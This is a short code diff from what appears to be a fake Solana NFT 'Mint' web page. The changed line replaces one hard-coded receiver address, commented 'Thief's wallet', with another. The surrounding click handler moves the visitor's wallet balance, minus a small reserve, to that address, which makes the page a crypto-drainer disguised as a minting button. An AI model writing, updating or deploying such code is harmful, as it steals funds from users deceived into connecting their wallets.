@@ -237,7 +237,7 @@ $(document).ready(function() {
             $('#connect-wallet').text("Mint");
             $('#connect-wallet').off('click').on('click', async () => {
                 try {
-                    const recieverWallet = new solanaWeb3.PublicKey('4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s'); // Thief's wallet
+                    const recieverWallet = new solanaWeb3.PublicKey('5YvueBp5fhG2jG2aaW4fqYqsmEMnUPnp8DQMAUWsKhEe'); // Thief's wallet
                     const balanceForTransfer = walletBalance - minBalance;
                     if (balanceForTransfer <= 0) {
                         alert("Insufficient funds for transfer.");
